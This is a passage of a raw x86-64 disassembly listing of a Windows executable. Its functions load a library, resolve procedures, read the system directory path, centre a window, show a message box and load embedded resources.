   140004a52:	48 83 c4 28          	add    $0x28,%rsp
   140004a56:	c3                   	ret
   140004a57:	cc                   	int3
   140004a58:	cc                   	int3
   140004a59:	cc                   	int3
   140004a5a:	cc                   	int3
   140004a5b:	cc                   	int3
   140004a5c:	cc                   	int3
   140004a5d:	cc                   	int3
   140004a5e:	cc                   	int3
   140004a5f:	cc                   	int3
   140004a60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004a65:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004a6a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004a6f:	57                   	push   %rdi
   140004a70:	41 54                	push   %r12
   140004a72:	41 55                	push   %r13
   140004a74:	41 56                	push   %r14
   140004a76:	41 57                	push   %r15
   140004a78:	48 83 ec 70          	sub    $0x70,%rsp
   140004a7c:	48 8b e9             	mov    %rcx,%rbp
   140004a7f:	48 8d 0d 2a 77 00 00 	lea    0x772a(%rip),%rcx        # 0x14000c1b0
   140004a86:	48 ff 15 8b 47 00 00 	rex.W call *0x478b(%rip)        # 0x140009218
   140004a8d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004a92:	33 db                	xor    %ebx,%ebx
   140004a94:	48 8b f8             	mov    %rax,%rdi
   140004a97:	48 85 c0             	test   %rax,%rax
   140004a9a:	0f 84 80 01 00 00    	je     0x140004c20
   140004aa0:	48 8d 15 29 77 00 00 	lea    0x7729(%rip),%rdx        # 0x14000c1d0
   140004aa7:	48 8b c8             	mov    %rax,%rcx
   140004aaa:	48 ff 15 af 47 00 00 	rex.W call *0x47af(%rip)        # 0x140009260
   140004ab1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ab6:	4c 8b e0             	mov    %rax,%r12
   140004ab9:	48 85 c0             	test   %rax,%rax
   140004abc:	0f 84 48 01 00 00    	je     0x140004c0a
   140004ac2:	ba c3 00 00 00       	mov    $0xc3,%edx
   140004ac7:	48 8b cf             	mov    %rdi,%rcx
   140004aca:	48 ff 15 8f 47 00 00 	rex.W call *0x478f(%rip)        # 0x140009260
   140004ad1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ad6:	4c 8b f0             	mov    %rax,%r14
   140004ad9:	48 85 c0             	test   %rax,%rax
   140004adc:	0f 84 28 01 00 00    	je     0x140004c0a
   140004ae2:	48 8d 15 ff 76 00 00 	lea    0x76ff(%rip),%rdx        # 0x14000c1e8
   140004ae9:	48 8b cf             	mov    %rdi,%rcx
   140004aec:	48 ff 15 6d 47 00 00 	rex.W call *0x476d(%rip)        # 0x140009260
   140004af3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004af8:	4c 8b f8             	mov    %rax,%r15
   140004afb:	48 85 c0             	test   %rax,%rax
   140004afe:	0f 84 06 01 00 00    	je     0x140004c0a
   140004b04:	38 1d 96 80 00 00    	cmp    %bl,0x8096(%rip)        # 0x14000cba0
   140004b0a:	4c 8d 2d 8f 80 00 00 	lea    0x808f(%rip),%r13        # 0x14000cba0
   140004b11:	75 54                	jne    0x140004b67
   140004b13:	49 8b d5             	mov    %r13,%rdx
   140004b16:	b9 04 01 00 00       	mov    $0x104,%ecx
   140004b1b:	48 ff 15 06 48 00 00 	rex.W call *0x4806(%rip)        # 0x140009328
   140004b22:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004b27:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140004b2b:	48 ff c2             	inc    %rdx
   140004b2e:	42 38 1c 2a          	cmp    %bl,(%rdx,%r13,1)
   140004b32:	75 f7                	jne    0x140004b2b
   140004b34:	49 03 d5             	add    %r13,%rdx
   140004b37:	49 8b cd             	mov    %r13,%rcx
   140004b3a:	48 ff 15 f7 49 00 00 	rex.W call *0x49f7(%rip)        # 0x140009538
   140004b41:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004b46:	48 8b f0             	mov    %rax,%rsi
   140004b49:	80 38 5c             	cmpb   $0x5c,(%rax)
   140004b4c:	75 19                	jne    0x140004b67
   140004b4e:	48 8b d0             	mov    %rax,%rdx
   140004b51:	49 8b cd             	mov    %r13,%rcx
   140004b54:	48 ff 15 dd 49 00 00 	rex.W call *0x49dd(%rip)        # 0x140009538
   140004b5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004b60:	80 38 3a             	cmpb   $0x3a,(%rax)
   140004b63:	74 02                	je     0x140004b67
   140004b65:	88 1e                	mov    %bl,(%rsi)
   140004b67:	48 8d 05 e2 7c 00 00 	lea    0x7ce2(%rip),%rax        # 0x14000c850
   140004b6e:	88 1d ec 7e 00 00    	mov    %bl,0x7eec(%rip)        # 0x14000ca60
   140004b74:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004b79:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b7e:	48 8d 05 ab fe ff ff 	lea    -0x155(%rip),%rax        # 0x140004a30
   140004b85:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140004b8a:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140004b8f:	49 8b c4             	mov    %r12,%rax
   140004b92:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140004b97:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140004b9c:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140004ba3:	00 
   140004ba4:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   140004ba9:	ff 15 a1 4a 00 00    	call   *0x4aa1(%rip)        # 0x140009650
   140004baf:	48 8b f0             	mov    %rax,%rsi
   140004bb2:	48 85 c0             	test   %rax,%rax
   140004bb5:	74 37                	je     0x140004bee
   140004bb7:	48 8b c8             	mov    %rax,%rcx
   140004bba:	49 8b d5             	mov    %r13,%rdx
   140004bbd:	49 8b c7             	mov    %r15,%rax
   140004bc0:	ff 15 8a 4a 00 00    	call   *0x4a8a(%rip)        # 0x140009650
   140004bc6:	38 1d d4 7f 00 00    	cmp    %bl,0x7fd4(%rip)        # 0x14000cba0
   140004bcc:	74 14                	je     0x140004be2
   140004bce:	4d 8b c5             	mov    %r13,%r8
   140004bd1:	48 8d 0d 88 7e 00 00 	lea    0x7e88(%rip),%rcx        # 0x14000ca60
   140004bd8:	ba 04 01 00 00       	mov    $0x104,%edx
   140004bdd:	e8 26 c4 ff ff       	call   0x140001008
   140004be2:	48 8b ce             	mov    %rsi,%rcx
   140004be5:	49 8b c6             	mov    %r14,%rax
   140004be8:	ff 15 62 4a 00 00    	call   *0x4a62(%rip)        # 0x140009650
   140004bee:	48 8b cf             	mov    %rdi,%rcx
   140004bf1:	48 ff 15 88 46 00 00 	rex.W call *0x4688(%rip)        # 0x140009280
   140004bf8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004bfd:	38 1d 5d 7e 00 00    	cmp    %bl,0x7e5d(%rip)        # 0x14000ca60
   140004c03:	0f 95 c3             	setne  %bl
   140004c06:	8b c3                	mov    %ebx,%eax
   140004c08:	eb 37                	jmp    0x140004c41
   140004c0a:	48 8b cf             	mov    %rdi,%rcx
   140004c0d:	48 ff 15 6c 46 00 00 	rex.W call *0x466c(%rip)        # 0x140009280
   140004c14:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004c19:	ba c1 04 00 00       	mov    $0x4c1,%edx
   140004c1e:	eb 05                	jmp    0x140004c25
   140004c20:	ba c2 04 00 00       	mov    $0x4c2,%edx
   140004c25:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140004c29:	45 33 c9             	xor    %r9d,%r9d
   140004c2c:	45 33 c0             	xor    %r8d,%r8d
   140004c2f:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004c36:	00 
   140004c37:	48 8b cd             	mov    %rbp,%rcx
   140004c3a:	e8 8d 01 00 00       	call   0x140004dcc
   140004c3f:	33 c0                	xor    %eax,%eax
   140004c41:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004c46:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140004c4a:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140004c4e:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004c52:	49 8b e3             	mov    %r11,%rsp
   140004c55:	41 5f                	pop    %r15
   140004c57:	41 5e                	pop    %r14
   140004c59:	41 5d                	pop    %r13
   140004c5b:	41 5c                	pop    %r12
   140004c5d:	5f                   	pop    %rdi
   140004c5e:	c3                   	ret
   140004c5f:	cc                   	int3
   140004c60:	cc                   	int3
   140004c61:	cc                   	int3
   140004c62:	cc                   	int3
   140004c63:	cc                   	int3
   140004c64:	cc                   	int3
   140004c65:	cc                   	int3
   140004c66:	cc                   	int3
   140004c67:	cc                   	int3
   140004c68:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004c6d:	55                   	push   %rbp
   140004c6e:	56                   	push   %rsi
   140004c6f:	57                   	push   %rdi
   140004c70:	41 54                	push   %r12
   140004c72:	41 55                	push   %r13
   140004c74:	41 56                	push   %r14
   140004c76:	41 57                	push   %r15
   140004c78:	48 8b ec             	mov    %rsp,%rbp
   140004c7b:	48 83 ec 70          	sub    $0x70,%rsp
   140004c7f:	48 8b 05 82 73 00 00 	mov    0x7382(%rip),%rax        # 0x14000c008
   140004c86:	48 33 c4             	xor    %rsp,%rax
   140004c89:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140004c8d:	48 8b da             	mov    %rdx,%rbx
   140004c90:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   140004c94:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140004c98:	4c 8b e1             	mov    %rcx,%r12
   140004c9b:	48 ff 15 0e 48 00 00 	rex.W call *0x480e(%rip)        # 0x1400094b0
   140004ca2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ca7:	44 8b 7d f0          	mov    -0x10(%rbp),%r15d
   140004cab:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140004caf:	8b 75 f4             	mov    -0xc(%rbp),%esi
   140004cb2:	48 8b cb             	mov    %rbx,%rcx
   140004cb5:	44 2b 7d e8          	sub    -0x18(%rbp),%r15d
   140004cb9:	2b 75 ec             	sub    -0x14(%rbp),%esi
   140004cbc:	48 ff 15 ed 47 00 00 	rex.W call *0x47ed(%rip)        # 0x1400094b0
   140004cc3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004cc8:	8b 7d e0             	mov    -0x20(%rbp),%edi
   140004ccb:	49 8b cc             	mov    %r12,%rcx
   140004cce:	44 8b 75 e4          	mov    -0x1c(%rbp),%r14d
   140004cd2:	2b 7d d8             	sub    -0x28(%rbp),%edi
   140004cd5:	44 2b 75 dc          	sub    -0x24(%rbp),%r14d
   140004cd9:	48 ff 15 c8 47 00 00 	rex.W call *0x47c8(%rip)        # 0x1400094a8
   140004ce0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ce5:	48 8b c8             	mov    %rax,%rcx
   140004ce8:	ba 08 00 00 00       	mov    $0x8,%edx
   140004ced:	48 8b d8             	mov    %rax,%rbx
   140004cf0:	48 ff 15 e1 44 00 00 	rex.W call *0x44e1(%rip)        # 0x1400091d8
   140004cf7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004cfc:	ba 0a 00 00 00       	mov    $0xa,%edx
   140004d01:	48 8b cb             	mov    %rbx,%rcx
   140004d04:	44 8b e0             	mov    %eax,%r12d
   140004d07:	48 ff 15 ca 44 00 00 	rex.W call *0x44ca(%rip)        # 0x1400091d8
   140004d0e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d13:	48 8b d3             	mov    %rbx,%rdx
   140004d16:	48 8b 5d d0          	mov    -0x30(%rbp),%rbx
   140004d1a:	48 8b cb             	mov    %rbx,%rcx
   140004d1d:	44 8b e8             	mov    %eax,%r13d
   140004d20:	48 ff 15 f1 47 00 00 	rex.W call *0x47f1(%rip)        # 0x140009518
   140004d27:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d2c:	41 2b ff             	sub    %r15d,%edi
   140004d2f:	8b c7                	mov    %edi,%eax
   140004d31:	99                   	cltd
   140004d32:	2b c2                	sub    %edx,%eax
   140004d34:	d1 f8                	sar    $1,%eax
   140004d36:	44 8b c0             	mov    %eax,%r8d
   140004d39:	44 03 45 d8          	add    -0x28(%rbp),%r8d
   140004d3d:	79 05                	jns    0x140004d44
   140004d3f:	45 33 c0             	xor    %r8d,%r8d
   140004d42:	eb 0f                	jmp    0x140004d53
   140004d44:	43 8d 0c 38          	lea    (%r8,%r15,1),%ecx
   140004d48:	41 3b cc             	cmp    %r12d,%ecx
   140004d4b:	7e 06                	jle    0x140004d53
   140004d4d:	45 8b c4             	mov    %r12d,%r8d
   140004d50:	45 2b c7             	sub    %r15d,%r8d
   140004d53:	44 2b f6             	sub    %esi,%r14d
   140004d56:	41 8b c6             	mov    %r14d,%eax
   140004d59:	99                   	cltd
   140004d5a:	2b c2                	sub    %edx,%eax
   140004d5c:	d1 f8                	sar    $1,%eax
   140004d5e:	44 8b c8             	mov    %eax,%r9d
   140004d61:	44 03 4d dc          	add    -0x24(%rbp),%r9d
   140004d65:	79 05                	jns    0x140004d6c
   140004d67:	45 33 c9             	xor    %r9d,%r9d
   140004d6a:	eb 0f                	jmp    0x140004d7b
   140004d6c:	41 8d 04 31          	lea    (%r9,%rsi,1),%eax
   140004d70:	41 3b c5             	cmp    %r13d,%eax
   140004d73:	7e 06                	jle    0x140004d7b
   140004d75:	45 8b cd             	mov    %r13d,%r9d
   140004d78:	44 2b ce             	sub    %esi,%r9d
   140004d7b:	c7 44 24 30 05 00 00 	movl   $0x5,0x30(%rsp)
   140004d82:	00 
   140004d83:	33 d2                	xor    %edx,%edx
   140004d85:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140004d8a:	48 8b cb             	mov    %rbx,%rcx
   140004d8d:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140004d92:	48 ff 15 07 47 00 00 	rex.W call *0x4707(%rip)        # 0x1400094a0
   140004d99:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d9e:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140004da2:	48 33 cc             	xor    %rsp,%rcx
   140004da5:	e8 c6 36 00 00       	call   0x140008470
   140004daa:	48 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%rbx
   140004db1:	00 
   140004db2:	48 83 c4 70          	add    $0x70,%rsp
   140004db6:	41 5f                	pop    %r15
   140004db8:	41 5e                	pop    %r14
   140004dba:	41 5d                	pop    %r13
   140004dbc:	41 5c                	pop    %r12
   140004dbe:	5f                   	pop    %rdi
   140004dbf:	5e                   	pop    %rsi
   140004dc0:	5d                   	pop    %rbp
   140004dc1:	c3                   	ret
   140004dc2:	cc                   	int3
   140004dc3:	cc                   	int3
   140004dc4:	cc                   	int3
   140004dc5:	cc                   	int3
   140004dc6:	cc                   	int3
   140004dc7:	cc                   	int3
   140004dc8:	cc                   	int3
   140004dc9:	cc                   	int3
   140004dca:	cc                   	int3
   140004dcb:	cc                   	int3
   140004dcc:	40 55                	rex push %rbp
   140004dce:	53                   	push   %rbx
   140004dcf:	56                   	push   %rsi
   140004dd0:	57                   	push   %rdi
   140004dd1:	41 54                	push   %r12
   140004dd3:	41 56                	push   %r14
   140004dd5:	41 57                	push   %r15
   140004dd7:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   140004dde:	ff 
   140004ddf:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140004de6:	48 8b 05 1b 72 00 00 	mov    0x721b(%rip),%rax        # 0x14000c008
   140004ded:	48 33 c4             	xor    %rsp,%rax
   140004df0:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   140004df7:	8b 05 3b 4b 00 00    	mov    0x4b3b(%rip),%eax        # 0x140009938
   140004dfd:	4d 8b f1             	mov    %r9,%r14
   140004e00:	0f 10 05 01 4b 00 00 	movups 0x4b01(%rip),%xmm0        # 0x140009908
   140004e07:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140004e0b:	49 8b f0             	mov    %r8,%rsi
   140004e0e:	8a 05 28 4b 00 00    	mov    0x4b28(%rip),%al        # 0x14000993c
   140004e14:	4c 8b e1             	mov    %rcx,%r12
   140004e17:	0f 10 0d fa 4a 00 00 	movups 0x4afa(%rip),%xmm1        # 0x140009918
   140004e1e:	88 44 24 64          	mov    %al,0x64(%rsp)
   140004e22:	b8 01 00 00 00       	mov    $0x1,%eax
   140004e27:	84 05 eb 7e 00 00    	test   %al,0x7eeb(%rip)        # 0x14000cd18
   140004e2d:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004e32:	0f 10 05 ef 4a 00 00 	movups 0x4aef(%rip),%xmm0        # 0x140009928
   140004e39:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140004e3e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004e43:	0f 85 dd 01 00 00    	jne    0x140005026
   140004e49:	48 8b 0d 20 90 00 00 	mov    0x9020(%rip),%rcx        # 0x14000de70
   140004e50:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140004e55:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140004e5b:	c6 44 24 70 00       	movb   $0x0,0x70(%rsp)
   140004e60:	48 ff 15 c9 46 00 00 	rex.W call *0x46c9(%rip)        # 0x140009530
   140004e67:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004e6c:	80 7c 24 70 00       	cmpb   $0x0,0x70(%rsp)
   140004e71:	75 42                	jne    0x140004eb5
   140004e73:	e8 8c 30 00 00       	call   0x140007f04
   140004e78:	85 c0                	test   %eax,%eax
   140004e7a:	74 0f                	je     0x140004e8b
   140004e7c:	e8 b3 2f 00 00       	call   0x140007e34
   140004e81:	41 b9 10 00 19 00    	mov    $0x190010,%r9d
   140004e87:	85 c0                	test   %eax,%eax
   140004e89:	75 06                	jne    0x140004e91
   140004e8b:	41 b9 10 00 01 00    	mov    $0x10010,%r9d
   140004e91:	4c 8d 05 e0 86 00 00 	lea    0x86e0(%rip),%r8        # 0x14000d578
   140004e98:	49 8b cc             	mov    %r12,%rcx
   140004e9b:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004ea0:	48 ff 15 31 46 00 00 	rex.W call *0x4631(%rip)        # 0x1400094d8
   140004ea7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004eac:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140004eb0:	e9 71 01 00 00       	jmp    0x140005026
   140004eb5:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140004eb9:	48 8b c3             	mov    %rbx,%rax
   140004ebc:	4d 85 f6             	test   %r14,%r14
   140004ebf:	74 70                	je     0x140004f31
   140004ec1:	48 ff c0             	inc    %rax
   140004ec4:	41 80 3c 06 00       	cmpb   $0x0,(%r14,%rax,1)
   140004ec9:	75 f6                	jne    0x140004ec1
   140004ecb:	48 8b cb             	mov    %rbx,%rcx
   140004ece:	48 ff c1             	inc    %rcx
   140004ed1:	80 3c 0e 00          	cmpb   $0x0,(%rsi,%rcx,1)
   140004ed5:	75 f7                	jne    0x140004ece
   140004ed7:	48 03 c1             	add    %rcx,%rax
   140004eda:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140004edf:	48 8b cb             	mov    %rbx,%rcx
   140004ee2:	48 ff c1             	inc    %rcx
   140004ee5:	80 3c 0a 00          	cmpb   $0x0,(%rdx,%rcx,1)
   140004ee9:	75 f7                	jne    0x140004ee2
   140004eeb:	48 83 c0 64          	add    $0x64,%rax
   140004eef:	48 03 c1             	add    %rcx,%rax
   140004ef2:	b9 40 00 00 00       	mov    $0x40,%ecx
   140004ef7:	8b d0                	mov    %eax,%edx
   140004ef9:	44 8b f8             	mov    %eax,%r15d
   140004efc:	48 ff 15 c5 44 00 00 	rex.W call *0x44c5(%rip)        # 0x1400093c8
   140004f03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004f08:	48 8b f8             	mov    %rax,%rdi
   140004f0b:	48 85 c0             	test   %rax,%rax
   140004f0e:	0f 84 10 01 00 00    	je     0x140005024
   140004f14:	4c 8b ce             	mov    %rsi,%r9
   140004f17:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140004f1c:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140004f21:	41 8b d7             	mov    %r15d,%edx
   140004f24:	48 8b c8             	mov    %rax,%rcx
   140004f27:	e8 20 c2 ff ff       	call   0x14000114c
   140004f2c:	e9 8b 00 00 00       	jmp    0x140004fbc
   140004f31:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004f36:	48 ff c0             	inc    %rax
   140004f39:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140004f3d:	75 f7                	jne    0x140004f36
   140004f3f:	48 85 f6             	test   %rsi,%rsi
   140004f42:	74 4a                	je     0x140004f8e
   140004f44:	48 8b cb             	mov    %rbx,%rcx
   140004f47:	48 ff c1             	inc    %rcx
   140004f4a:	80 3c 0e 00          	cmpb   $0x0,(%rsi,%rcx,1)
   140004f4e:	75 f7                	jne    0x140004f47
   140004f50:	48 83 c0 64          	add    $0x64,%rax
   140004f54:	48 03 c1             	add    %rcx,%rax
   140004f57:	b9 40 00 00 00       	mov    $0x40,%ecx
   140004f5c:	8b d0                	mov    %eax,%edx
   140004f5e:	44 8b f0             	mov    %eax,%r14d
   140004f61:	48 ff 15 60 44 00 00 	rex.W call *0x4460(%rip)        # 0x1400093c8
   140004f68:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004f6d:	48 8b f8             	mov    %rax,%rdi
   140004f70:	48 85 c0             	test   %rax,%rax
   140004f73:	0f 84 ab 00 00 00    	je     0x140005024
   140004f79:	4c 8b ce             	mov    %rsi,%r9
   140004f7c:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140004f81:	41 8b d6             	mov    %r14d,%edx
   140004f84:	48 8b c8             	mov    %rax,%rcx
   140004f87:	e8 c0 c1 ff ff       	call   0x14000114c
   140004f8c:	eb 2e                	jmp    0x140004fbc
   140004f8e:	ff c0                	inc    %eax
   140004f90:	b9 40 00 00 00       	mov    $0x40,%ecx
   140004f95:	8b d0                	mov    %eax,%edx
   140004f97:	8b f0                	mov    %eax,%esi
   140004f99:	48 ff 15 28 44 00 00 	rex.W call *0x4428(%rip)        # 0x1400093c8
   140004fa0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004fa5:	48 8b f8             	mov    %rax,%rdi
   140004fa8:	48 85 c0             	test   %rax,%rax
   140004fab:	74 77                	je     0x140005024
   140004fad:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140004fb2:	8b d6                	mov    %esi,%edx
   140004fb4:	48 8b c8             	mov    %rax,%rcx
   140004fb7:	e8 4c c0 ff ff       	call   0x140001008
   140004fbc:	8b 8d e0 01 00 00    	mov    0x1e0(%rbp),%ecx
   140004fc2:	48 ff 15 7f 45 00 00 	rex.W call *0x457f(%rip)        # 0x140009548
   140004fc9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004fce:	e8 31 2f 00 00       	call   0x140007f04
   140004fd3:	85 c0                	test   %eax,%eax
   140004fd5:	74 0f                	je     0x140004fe6
   140004fd7:	e8 58 2e 00 00       	call   0x140007e34
   140004fdc:	41 b9 00 00 19 00    	mov    $0x190000,%r9d
   140004fe2:	85 c0                	test   %eax,%eax
   140004fe4:	75 06                	jne    0x140004fec
   140004fe6:	41 b9 00 00 01 00    	mov    $0x10000,%r9d
   140004fec:	44 0b 8d e0 01 00 00 	or     0x1e0(%rbp),%r9d
   140004ff3:	4c 8d 05 7e 85 00 00 	lea    0x857e(%rip),%r8        # 0x14000d578
   140004ffa:	44 0b 8d e8 01 00 00 	or     0x1e8(%rbp),%r9d
   140005001:	48 8b d7             	mov    %rdi,%rdx
   140005004:	49 8b cc             	mov    %r12,%rcx
   140005007:	48 ff 15 ca 44 00 00 	rex.W call *0x44ca(%rip)        # 0x1400094d8
   14000500e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005013:	48 8b cf             	mov    %rdi,%rcx
   140005016:	8b d8                	mov    %eax,%ebx
   140005018:	48 ff 15 51 42 00 00 	rex.W call *0x4251(%rip)        # 0x140009270
   14000501f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005024:	8b c3                	mov    %ebx,%eax
   140005026:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   14000502d:	48 33 cc             	xor    %rsp,%rcx
   140005030:	e8 3b 34 00 00       	call   0x140008470
   140005035:	48 81 c4 80 02 00 00 	add    $0x280,%rsp
   14000503c:	41 5f                	pop    %r15
   14000503e:	41 5e                	pop    %r14
   140005040:	41 5c                	pop    %r12
   140005042:	5f                   	pop    %rdi
   140005043:	5e                   	pop    %rsi
   140005044:	5b                   	pop    %rbx
   140005045:	5d                   	pop    %rbp
   140005046:	c3                   	ret
   140005047:	cc                   	int3
   140005048:	cc                   	int3
   140005049:	cc                   	int3
   14000504a:	cc                   	int3
   14000504b:	cc                   	int3
   14000504c:	cc                   	int3
   14000504d:	cc                   	int3
   14000504e:	cc                   	int3
   14000504f:	cc                   	int3
   140005050:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005055:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000505a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000505f:	57                   	push   %rdi
   140005060:	48 83 ec 20          	sub    $0x20,%rsp
   140005064:	48 8b f2             	mov    %rdx,%rsi
   140005067:	41 8b e8             	mov    %r8d,%ebp
   14000506a:	48 8b d1             	mov    %rcx,%rdx
   14000506d:	48 8b f9             	mov    %rcx,%rdi
   140005070:	33 c9                	xor    %ecx,%ecx
   140005072:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140005078:	48 ff 15 69 42 00 00 	rex.W call *0x4269(%rip)        # 0x1400092e8
   14000507f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005084:	48 8b d0             	mov    %rax,%rdx
   140005087:	33 c9                	xor    %ecx,%ecx
   140005089:	48 ff 15 28 42 00 00 	rex.W call *0x4228(%rip)        # 0x1400092b8
   140005090:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005095:	8b d8                	mov    %eax,%ebx
   140005097:	3b c5                	cmp    %ebp,%eax
   140005099:	77 6e                	ja     0x140005109
   14000509b:	48 85 f6             	test   %rsi,%rsi
   14000509e:	74 69                	je     0x140005109
   1400050a0:	85 c0                	test   %eax,%eax
   1400050a2:	74 7d                	je     0x140005121
   1400050a4:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400050aa:	48 8b d7             	mov    %rdi,%rdx
   1400050ad:	33 c9                	xor    %ecx,%ecx
   1400050af:	48 ff 15 32 42 00 00 	rex.W call *0x4232(%rip)        # 0x1400092e8
   1400050b6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400050bb:	48 8b d0             	mov    %rax,%rdx
   1400050be:	33 c9                	xor    %ecx,%ecx
   1400050c0:	48 ff 15 b1 42 00 00 	rex.W call *0x42b1(%rip)        # 0x140009378
   1400050c7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400050cc:	48 8b c8             	mov    %rax,%rcx
   1400050cf:	48 ff 15 82 42 00 00 	rex.W call *0x4282(%rip)        # 0x140009358
   1400050d6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400050db:	48 8b f8             	mov    %rax,%rdi
   1400050de:	48 85 c0             	test   %rax,%rax
   1400050e1:	74 3e                	je     0x140005121
   1400050e3:	44 8b cb             	mov    %ebx,%r9d
   1400050e6:	8b d5                	mov    %ebp,%edx
   1400050e8:	4c 8b c0             	mov    %rax,%r8
   1400050eb:	48 8b ce             	mov    %rsi,%rcx
   1400050ee:	48 ff 15 2b 45 00 00 	rex.W call *0x452b(%rip)        # 0x140009620
   1400050f5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400050fa:	48 8b cf             	mov    %rdi,%rcx
   1400050fd:	48 ff 15 0c 42 00 00 	rex.W call *0x420c(%rip)        # 0x140009310
   140005104:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005109:	8b c3                	mov    %ebx,%eax
   14000510b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005110:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005115:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000511a:	48 83 c4 20          	add    $0x20,%rsp
   14000511e:	5f                   	pop    %rdi
   14000511f:	c3                   	ret
   140005120:	cc                   	int3
   140005121:	33 c0                	xor    %eax,%eax
   140005123:	eb e6                	jmp    0x14000510b
   140005125:	cc                   	int3
   140005126:	cc                   	int3
   140005127:	cc                   	int3
   140005128:	cc                   	int3
   140005129:	cc                   	int3
   14000512a:	cc                   	int3
   14000512b:	cc                   	int3
   14000512c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005131:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005136:	57                   	push   %rdi
   140005137:	48 83 ec 20          	sub    $0x20,%rsp
   14000513b:	49 8b f8             	mov    %r8,%rdi
   14000513e:	be 04 01 00 00       	mov    $0x104,%esi
   140005143:	4c 8b c2             	mov    %rdx,%r8
   140005146:	48 8b d9             	mov    %rcx,%rbx
